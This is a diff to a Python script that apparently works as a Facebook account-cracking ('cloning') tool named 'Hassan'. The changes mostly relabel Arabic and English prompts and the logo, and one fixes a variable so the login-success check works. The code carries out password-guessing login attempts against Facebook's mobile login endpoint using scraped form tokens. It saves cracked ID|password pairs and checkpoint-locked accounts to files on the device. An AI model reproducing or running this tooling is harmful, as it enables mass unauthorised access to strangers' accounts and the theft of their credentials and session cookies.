@@ -108,7 +108,8 @@ def uaku():
 
 
 logo=(f"""\x1b[1;97m
-مطور ادات حسوني  @TTL9T
+
+ @TTL9T حسن ملك المطور الرسمي
 🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦
 🟦⬜⬜⬜⬜⬜⬜⬜⬜⬜🟦
 🟦⬜🟦🟦🟦⬜🟦🟦🟦⬜🟦
@@ -119,11 +120,11 @@ logo=(f"""\x1b[1;97m
 🟦⬜🟦⬜⬜⬜⬜⬜🟦⬜🟦
 🟦⬜🟦🟦🟦⬜🟦🟦🟦⬜🟦
 🟦⬜⬜⬜⬜⬜⬜⬜⬜⬜🟦
-🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦
+🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦
 \033[1;31m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;37m
  Author    : ABBAS SJ
  Github    :X
- Tool Name : \033[1;36m Hassan \033[1;37m
+ Tool Name : \033[1;36mHassan\033[1;37m
  Tool Type : \033[1;31mTRIAL\033[1;37m
  Version   : \033[1;36m1.2\033[1;37m
 \033[1;31m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;37m
@@ -145,7 +146,7 @@ os.system('git pull')
 
 def Fof():
 	clear()
-	print(f" [\033[1;32m1\033[1;37m] من ملف")
+	print(f" [\033[1;32m1\033[1;37m] من ملفا ")
 	print(f" [\033[1;32m2\033[1;37m] الاستنساخ العشوائي BD ")
 	#print(f" [3] Gmail Cloning")
 	print(f" [\033[1;31m0\033[1;37m] Exit")
@@ -157,7 +158,7 @@ def Fof():
 		#gml()
 	if me in ["1", "01","11","A","a"]:
 		clear()
-		file = input(f' [\033[1;32m✓\033[1;37m] ضع موقع الملف [\033[1;32m❯\033[1;37m] ')
+		file = input(f' [\033[1;32m✓\033[1;37m] Put المسار [\033[1;32m❯\033[1;37m] ')
 		try:
 			fo = open(file,'r').read().splitlines()
 		except FileNotFoundError:
@@ -167,13 +168,13 @@ def Fof():
 		mthd=input(f' [\033[1;32m✓\033[1;37m] Choice : ')
 		plist=[]
 		try:
-			ps_limit = int(input(f' [\033[1;32m?\033[1;37m] كم عدد كلمات المرور التي تريد إضافتها [\033[1;32m⟩\033[1;37m] '))
+			ps_limit = int(input(f' [\033[1;32m?\033[1;37m] عداد الباسورد [\033[1;32m⟩\033[1;37m] '))
 		except:
 			ps_limit =1
 		print(f' [\033[1;32m•\033[1;37m] Example: \033[1;36mfirst last,firtslast,first123 \033[1;37m')
 		for i in range(ps_limit):
-			plist.append(input(f' [\033[1;32m✓\033[1;37m] Put باسورد {i+1}[\033[1;32m❯\033[1;37m] '))
-		print(f' [\033[1;32m?\033[1;37m] Do You ذهب لإظهار معرفات سكيور (y/n): ')
+			plist.append(input(f' [\033[1;32m✓\033[1;37m] الباسورد {i+1}[\033[1;32m❯\033[1;37m] '))
+		print(f' [\033[1;32m?\033[1;37m] Do You اظهار حساب السكيور (y/n): ')
 		cx=input(f' [\033[1;32m✓\033[1;37m] Choice : ')
 		if cx in ['n','N','no','NO','2']:
 			pcp.append(f'n')
@@ -227,7 +228,7 @@ def m1(ids,names,passlist):
                         idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
                         complete = session.post(f'https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                         Fof=session.cookies.get_dict().keys()
-                        if "c_user" in Hassan:
+                        if "c_user" in Fof:
                                 coki=session.cookies.get_dict()
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                 print(f'\r\r\033[1;32m [Hassan\033[1;36m•\033[1;37m\033[1;32mشغال] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
@@ -238,8 +239,8 @@ def m1(ids,names,passlist):
                                 break
                         elif 'checkpoint' in Fof:
                                 if 'y' in pcp:
-                                        print(f'\r\r\x1b[38;5;208m [Hassan• سكيور ] '+ids+' • '+pas+'\033[1;97m')
-                                        open(f'/sdcard/Hassan• سكيور .txt', 'a').write(ids+'|'+pas+'\n')
+                                        print(f'\r\r\x1b[38;5;208m [Hassan•CP] '+ids+' • '+pas+'\033[1;97m')
+                                        open(f'/sdcard/Hassan•CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
@@ -273,16 +274,16 @@ def m3(ids,names,passlist):
                         if "c_user" in Fof:
                                 coki=session.cookies.get_dict()
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print(f'\r\r\033[1;32m [Hassan\033[1;36m•\033[1;37m\033[1;32mOK] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
+                                print(f'\r\r\033[1;32m [Hassan\033[1;36m•\033[1;37m\033[1;32mشغال] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
                                 #cek_apk(session,coki)
                                 #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
-                                open(f'/sdcard/Hassan• شغال •M3.txt', 'a').write(ids+'|'+pas+'\n')
+                                open(f'/sdcard/Hassan•OK•M3.txt', 'a').write(ids+'|'+pas+'\n')
                                 oks.append(ids)
                                 break
                         elif 'checkpoint' in Fof:
                                 if 'y' in pcp:
-                                        print(f'\r\r\x1b[38;5;208m [Hassan• سكيور ] '+ids+' • '+pas+'\033[1;97m')
-                                        open(f'/sdcard/Hassan• سكيور.txt', 'a').write(ids+'|'+pas+'\n')
+                                        print(f'\r\r\x1b[38;5;208m [Hassan•CP] '+ids+' • '+pas+'\033[1;97m')
+                                        open(f'/sdcard/Hassan•CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
@@ -295,7 +296,7 @@ def m3(ids,names,passlist):
 
 def m2(ids,names,passlist):
         global loop,oks,cps
-        sys.stdout.write(f'\r\r\033[1;37m [Hassan] \033[1;36m•\033[1;37m %s \033[1;36m•\033[1;37m شغال \033[1;36m•\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
+        sys.stdout.write(f'\r\r\033[1;37m [Hassan] \033[1;36m•\033[1;37m %s \033[1;36m•\033[1;37m OK \033[1;36m•\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
         session = requests.Session()
         try:
                 first = names.split(f' ')[0]
@@ -319,13 +320,13 @@ def m2(ids,names,passlist):
                                 print(f'\r\r\033[1;32m [Hassan\033[1;36m•\033[1;37m\033[1;32mشغال] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
                                 #cek_apk(session,coki)
                                 #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
-                                open(f'/sdcard/Hassan• شغال •M2.txt', 'a').write(ids+'|'+pas+'\n')
+                                open(f'/sdcard/Hassan•شغال•M2.txt', 'a').write(ids+'|'+pas+'\n')
                                 oks.append(ids)
                                 break
                         elif 'checkpoint' in Fof:
                                 if 'y' in pcp:
-                                        print(f'\r\r\x1b[38;5;208m [Hassan• سكيور] '+ids+' • '+pas+'\033[1;97m')
-                                        open(f'/sdcard/Hassan• سكيور .txt', 'a').write(ids+'|'+pas+'\n')
+                                        print(f'\r\r\x1b[38;5;208m [Hassan•CP] '+ids+' • '+pas+'\033[1;97m')
+                                        open(f'/sdcard/Hassan•CP.txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
@@ -359,16 +360,16 @@ def m4(ids,names,passlist):
                         if "c_user" in Fof:
                                 coki=session.cookies.get_dict()
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
-                                print(f'\r\r\033[1;32m [Hassan\033[1;36m•\033[1;37m\033[1;32mشغال] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
+                                print(f'\r\r\033[1;32m [Hassan\033[1;36m•\033[1;37m\033[1;32mOK] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
                                 #cek_apk(session,coki)
                                 #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
-                                open(f'/sdcard/Hassan•شغال•M4.txt', 'a').write(ids+'|'+pas+'\n')
+                                open(f'/sdcard/Hassan• شغال •M4.txt', 'a').write(ids+'|'+pas+'\n')
                                 oks.append(ids)
                                 break
                         elif 'checkpoint' in Fof:
                                 if 'y' in pcp:
-                                        print(f'\r\r\x1b[38;5;208m [Hassan• سكيور] '+ids+' • '+pas+'\033[1;97m')
-                                        open(f'/sdcard/Hassanسكيور•.txt', 'a').write(ids+'|'+pas+'\n')
+                                        print(f'\r\r\x1b[38;5;208m [Hassan• سكيور ] '+ids+' • '+pas+'\033[1;97m')
+                                        open(f'/sdcard/Hassan• سكيور .txt', 'a').write(ids+'|'+pas+'\n')
                                         cps.append(ids)
                                         break
                                 else:
